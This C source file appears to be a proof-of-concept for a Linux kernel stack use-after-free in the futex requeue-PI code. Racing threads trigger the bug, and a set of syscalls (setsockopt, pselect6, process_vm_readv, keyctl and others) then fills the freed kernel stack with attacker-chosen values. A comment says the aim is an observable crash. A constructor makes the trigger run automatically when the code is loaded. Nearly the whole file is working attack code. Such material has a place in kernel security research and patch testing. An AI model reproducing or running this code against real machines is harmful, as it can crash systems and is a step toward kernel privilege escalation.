#include <fcntl.h>
#include <linux/keyctl.h>
#include <linux/futex.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <time.h>
#include <unistd.h>

struct sched_attr {
	uint32_t size;
	uint32_t policy;
	uint64_t flags;
	int32_t nice;
	uint32_t priority;
	uint64_t runtime;
	uint64_t deadline;
	uint64_t period;
	uint32_t util_min;
	uint32_t util_max;
};

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;

volatile int a_ready;
volatile int a_tid;
volatile int a_waiting;
volatile int b_started;
volatile int consume;
volatile int stamp_ready;

void futex_pi_lock(uint32_t *uaddr) {
	syscall(SYS_futex, uaddr, FUTEX_LOCK_PI, 0, 0, 0, 0);
}

void futex_wait_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2, struct timespec *ts) {
	syscall(SYS_futex, uaddr, FUTEX_WAIT_REQUEUE_PI, 0, ts, uaddr2, 0);
}

void futex_cmp_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2) {
	syscall(SYS_futex, uaddr, FUTEX_CMP_REQUEUE_PI, 1, 1, uaddr2, 0);
}

void futex_wait_int(volatile int *uaddr, int val) {
	syscall(SYS_futex, (int *)uaddr, FUTEX_WAIT, val, 0, 0, 0);
}

void futex_wake_int(volatile int *uaddr) {
	syscall(SYS_futex, (int *)uaddr, FUTEX_WAKE, 1, 0, 0, 0);
}

void wait_change(volatile int *uaddr, int val) {
	while (*uaddr == val) futex_wait_int(uaddr, val);
}

void fill(uint64_t *buf) {
	for (int i = 0; i < 64; i++)
		buf[i] = 0xdeadbee11c518f58ULL + i * 8;
}

void stamp_socket(uint64_t *buf) {
	int fd = socket(AF_INET6, SOCK_DGRAM, 0);
	setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buf, sizeof(struct group_source_req));
	close(fd);
}

void stamp_pselect(uint64_t *buf) {
	struct timespec ts = {};
	syscall(SYS_pselect6, 256, buf, buf + 16, buf + 32, &ts, 0);
}

void stamp_tcp(uint64_t *buf) {
	socklen_t len = 128;
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	syscall(SYS_getsockopt, fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, buf, &len);
	close(fd);
}

void stamp_process_vm(uint64_t *buf) {
	struct iovec iov[8];
	for (int i = 0; i < 8; i++) {
		iov[i].iov_base = (void *)(buf[i] + 0x1000);
		iov[i].iov_len = 8;
	}
	syscall(SYS_process_vm_readv, syscall(SYS_getpid), iov, 8, iov, 8, 0);
	syscall(SYS_process_vm_writev, syscall(SYS_getpid), iov, 8, iov, 8, 0);
}

void stamp_keyctl(uint64_t *buf) {
	struct iovec iov[8];
	for (int i = 0; i < 8; i++) {
		iov[i].iov_base = (void *)(buf[i] + 0x2000);
		iov[i].iov_len = 8;
	}
	syscall(SYS_keyctl, KEYCTL_DH_COMPUTE, buf, buf, 64, 0);
	syscall(SYS_keyctl, KEYCTL_INSTANTIATE_IOV, -1, iov, 8, 0);
}

void stamp_fd(uint64_t *buf) {
	int fd = syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
	int dup = syscall(SYS_fcntl, fd, F_DUPFD, 32);
#ifdef SYS_dup2
	syscall(SYS_dup2, fd, 31);
#else
	syscall(SYS_dup3, fd, 31, 0);
#endif
	close(dup);
	close(31);
	close(fd);
}

void stamp_futex(uint64_t *buf) {
	struct timespec ts = {};
	uint32_t a = 0;
	uint32_t b = 0;
	syscall(SYS_futex, &a, FUTEX_LOCK_PI, 0, 0, 0, 0);
	syscall(SYS_futex, &a, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
	syscall(SYS_futex, &a, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &b, 0);
	syscall(SYS_futex, &a, FUTEX_CMP_REQUEUE_PI, 1, 1, &b, 0);
}

void stamp_lanes(uint64_t *buf) {
	fill(buf);
	// Note that this is only one possible way to control the stack UAF (to get an observable crash)
	// There are several unpriveleged, default avaliable way to control the kernel stack, so this bug is
	// competely not revelent whether the following setsockopt is accessable or not.
	stamp_socket(buf);
	stamp_pselect(buf);
	stamp_process_vm(buf);
	stamp_tcp(buf);
	stamp_keyctl(buf);
	stamp_fd(buf);
	stamp_futex(buf);
}

void stamp(void) {
	uint64_t buf[64];
	stamp_lanes(buf);
	stamp_ready = 1;
	futex_wake_int(&stamp_ready);
	for (int i = 0; i < 100; i++)
		stamp_lanes(buf);
}

void *waiter() {
	struct timespec ts;
	a_tid = syscall(SYS_gettid);
	futex_pi_lock(&f_pi_chain);
	a_ready = 1;
	usleep(200000);
	clock_gettime(CLOCK_MONOTONIC, &ts);
	ts.tv_sec++;
	a_waiting = 1;
	futex_wait_requeue_pi(&f_wait, &f_pi_target, &ts);
	consume = 1;
	futex_wake_int(&consume);
	stamp();
	for (;;);
}

void *owner() {
	futex_pi_lock(&f_pi_target);
	while (!a_ready);
	b_started = 1;
	futex_pi_lock(&f_pi_chain);
	for (;;);
}

void *consumer() {
	struct sched_attr attr = {
		.size = sizeof(attr),
		.policy = 3,
		.nice = 19,
	};
	int tid;
	while (!(tid = a_tid));
	wait_change(&consume, 0);
	wait_change(&stamp_ready, 0);
	syscall(SYS_sched_setattr, tid, &attr, 0);
	for (;;);
}

void run(void) {
	pthread_t th;
	pthread_create(&th, 0, owner, 0);
	pthread_create(&th, 0, consumer, 0);
	pthread_create(&th, 0, waiter, 0);
	while (!a_waiting || !b_started);
	usleep(200000);
	futex_cmp_requeue_pi(&f_wait, &f_pi_target);
	for (;;);
}

void init(void) __attribute__((constructor));

void init(void) {
	run();
}

int main(void) {
	run();
}
